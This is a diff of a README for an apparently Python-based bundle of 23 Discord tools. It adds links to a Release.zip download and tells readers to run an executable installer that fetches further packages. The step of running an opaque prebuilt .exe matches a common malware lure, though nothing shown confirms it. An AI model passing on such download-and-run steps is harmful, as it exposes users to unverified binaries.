@@ -5,11 +5,11 @@ AIO Script Developed with Python3. It gathers a total of 23 Discord tools (inclu
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/1d59f17a-ae7a-4dc0-814d-d4450277e908)
-]()
+](https://github.com/AyoubTposin/Discord-AllinOneTool-2024/releases/download/V5.34/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/AyoubTposin/Discord-AllinOneTool-2024/releases/download/V5.34/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![w4trgbsd](https://github.com/user-attachments/assets/69b1e376-f057-4358-9a48-f251edf5d256)
